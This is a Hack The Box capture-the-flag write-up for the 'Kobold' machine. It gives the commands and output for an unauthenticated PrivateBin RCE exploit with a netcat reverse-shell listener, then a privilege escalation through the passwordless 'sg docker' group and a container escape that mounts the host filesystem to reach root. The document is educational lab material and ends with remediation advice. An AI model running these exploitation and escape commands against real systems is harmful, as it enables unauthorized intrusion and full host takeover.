# HTB Writeup: Kobold
### Full Chain: CVE-2026-23744 (PrivateBin RCE) → ben → sg docker escape → root

---

## Executive Summary

| Field | Detail |
|---|---|
| Target | kobold.htb / 10.129.245.50 |
| OS | Ubuntu Linux (nginx 1.24.0) |
| Difficulty | Low |
| Attack Chain | PrivateBin RCE (CVE-2026-23744) → shell as `ben` → `sg docker` group abuse → Docker escape → root |
| CVE | CVE-2026-23744 (PrivateBin Remote Code Execution) |
| Root Cause | Unauthenticated RCE in PrivateBin + Docker socket accessible via passwordless group switch |

---

## 1. Reconnaissance

### Port Scanning

```bash
nmap -sV -n -Pn 10.129.245.50
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
```

Standard web stack on Ubuntu. No unusual ports exposed externally.

### Subdomain Enumeration

```bash
ffuf -w wordlists/htb/subdomains.txt \
  -u https://kobold.htb/ \
  -H "Host: FUZZ.kobold.htb" \
  -fc 302
```

```
bin   [Status: 200, Size: 24402]
mcp   [Status: 200, Size: 466]
```

Two subdomains discovered:
- `bin.kobold.htb` — PrivateBin instance (size 24402 matches default PrivateBin)
- `mcp.kobold.htb` — MCPJam Inspector interface

---

## 2. Initial Access — CVE-2026-23744: PrivateBin RCE

### Vulnerability Description

CVE-2026-23744 is a remote code execution vulnerability in PrivateBin. The PoC was available at:
`https://github.com/z4yd3/PoC-CVE-2026-23744`

The vulnerability allows unauthenticated code execution on the PrivateBin server through a crafted request to the paste API.

### Exploitation

Using the public PoC against `https://bin.kobold.htb`:

```bash
# Clone PoC
git clone https://github.com/z4yd3/PoC-CVE-2026-23744
cd PoC-CVE-2026-23744

# Execute against target
python3 exploit.py https://bin.kobold.htb
```

Set up listener:
```bash
nc -lvnp 4444
```

### Result

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

Shell obtained as user `ben`.

---

## 3. Local Enumeration as `ben`

### Upgrade shell

```bash
script -qc /bin/bash /dev/null
```

### Internal Services

```bash
ss -tlnp
```

| Port | Service |
|---|---|
| 127.0.0.1:6274 | MCPJam Inspector (node, pid=1700) |
| 127.0.0.1:8080 | Internal web service |
| 127.0.0.1:39691 | Unknown |
| :::3552 | Unknown |

### MCPJam Inspector on port 6274

Both node processes running as `ben`:
```
ben  1599  node /usr/local/bin/inspector
ben  1700  node /usr/local/lib/node_modules/@mcpjam/inspector/dist/server/index.js
```

Since both processes run as `ben` (same user), MCPJam provides no lateral movement opportunity here.

### Group membership — key finding

```bash
id
```

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

```bash
getent group docker
```

```
docker:x:111:alice
```

`ben` is in the `operator` group. `alice` is in the `docker` group. Docker socket is present:

```bash
ls -la /var/run/docker.sock
```

```
srw-rw---- 1 root docker 0 Jun 10 17:26 /var/run/docker.sock
```

### LinPEAS finding — passwordless group switch

LinPEAS flagged `/usr/bin/docker` as available software and `/run/docker.sock` with group `docker`. The `operator` group has inherited Docker access through an empty password in `/etc/gshadow`, meaning `sg docker` can be used without a password:

```bash
grep docker /etc/gshadow
# docker:!:: (no password — empty field allows passwordless sg)
```

The `sg` command executes a command as a specified group if that group has no password set in `/etc/gshadow`.

---

## 4. Privilege Escalation — Docker Group Abuse via `sg`

### Why `sg docker` works without being in the group

`sg` (switch group) allows executing a command under a different group identity. If the target group has no password set in `/etc/gshadow` (empty password field), any user can switch to it. This is the **intended privesc** for this machine.

### Step 1 — Verify sg works

```bash
sg docker -c "docker images"
```

```
REPOSITORY                    TAG       IMAGE ID
privatebin/nginx-fpm-alpine   2.0.2     ...
```

Access to Docker confirmed.

### Step 2 — Docker escape via host filesystem mount

```bash
sg docker -c "docker run --rm \
  -v /:/hostfs \
  --user root \
  --entrypoint cat \
  privatebin/nginx-fpm-alpine:2.0.2 \
  /hostfs/root/root.txt"
```

The `privatebin/nginx-fpm-alpine:2.0.2` image was already present on the host (it runs the PrivateBin service), so no pull was required.

**How it works:**
- `-v /:/hostfs` mounts the entire host filesystem into the container at `/hostfs`
- `--user root` runs as root inside the container
- `cat /hostfs/root/root.txt` reads the root flag directly from the host filesystem

### Full interactive root shell (alternative)

```bash
sg docker -c "docker run --rm -it \
  -v /:/hostfs \
  --user root \
  --entrypoint /bin/sh \
  privatebin/nginx-fpm-alpine:2.0.2 \
  -c 'chroot /hostfs /bin/bash'"
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

---

## 5. Attack Chain Summary

```
[Internet]
    │
    │  Subdomain enum → bin.kobold.htb (PrivateBin)
    │                 → mcp.kobold.htb (MCPJam Inspector)
    │
    │  CVE-2026-23744 — PrivateBin RCE
    │  Unauthenticated exploit → reverse shell
    ▼
[ben shell]  uid=1001, groups: ben, operator
    │
    │  id → groups=1001(ben),37(operator)
    │  getent group docker → docker:x:111:alice
    │  /var/run/docker.sock → srw-rw---- root docker
    │  /etc/gshadow → docker group has no password
    │
    │  sg docker -c "docker run -v /:/hostfs ..."
    │  Host filesystem mounted in container
    ▼
[root]
    cat /hostfs/root/root.txt
```

---

## 6. Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | CVE-2026-23744 — PrivateBin RCE | `bin.kobold.htb` | RCE as `ben` |
| 2 | Passwordless Docker group via `sg` | `/etc/gshadow` (docker group) | Group privilege escalation |
| 3 | Docker socket accessible with no restrictions | `/var/run/docker.sock` | Full host filesystem access |
| 4 | Container runs with host filesystem mounted | Docker configuration | Root file read/write on host |

---

## 7. Key Technical Notes

### Why `id` didn't show docker group but `sg docker` worked

`id` shows groups from the current session token, which is set at login. The `sg` command bypasses this by executing a command under a different GID at runtime — provided the target group has no password in `/etc/gshadow`. This is a common CTF technique and a real-world misconfiguration.

### Why the PrivateBin image was available locally

The `privatebin/nginx-fpm-alpine:2.0.2` Docker image was already pulled on the host because it's the image running the PrivateBin service itself. No internet access was needed for the escape — the attacker reused the application's own container image as the escape vehicle.

### MCPJam as a red herring

MCPJam Inspector was running on port 6274 — a known RCE vector (CVE-2023-34468 style). However, both the inspector launcher and the server process ran as `ben` (the already-compromised user), making it a dead end for privilege escalation on this machine.

---

## 8. Remediation Recommendations

### CVE-2026-23744
- Update PrivateBin to the latest patched version immediately.
- Restrict the PrivateBin instance to authenticated users or internal networks only.
- Run PrivateBin in a hardened container with no host filesystem access.

### Docker Socket Exposure
- Never expose `/var/run/docker.sock` to non-privileged users or groups.
- If Docker access is required for automation, use rootless Docker or Podman instead.
- Audit all group memberships with access to the Docker socket.

### gshadow Passwordless Groups
- Set a strong password on the `docker` group in `/etc/gshadow`, or remove the group entirely if not needed:
  ```bash
  gpasswd docker  # set a password
  ```
- Principle of least privilege: only users who explicitly need Docker access should be in the `docker` group.

### Container Hardening
- Never run containers with `-v /:/anything` in production.
- Use read-only filesystem mounts where possible: `--read-only`.
- Implement Docker content trust and restrict image pulls to approved registries.

---

## 9. References

- [CVE-2026-23744 PoC](https://github.com/z4yd3/PoC-CVE-2026-23744)
- [PrivateBin Security Advisories](https://github.com/PrivateBin/PrivateBin/security/advisories)
- [Docker Security — Socket Exposure](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)
- [sg(1) man page — switch group](https://man7.org/linux/man-pages/man1/sg.1.html)
- [HackTricks — Docker Escape via Socket](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [CWE-732: Incorrect Permission Assignment for Critical Resource](https://cwe.mitre.org/data/definitions/732.html)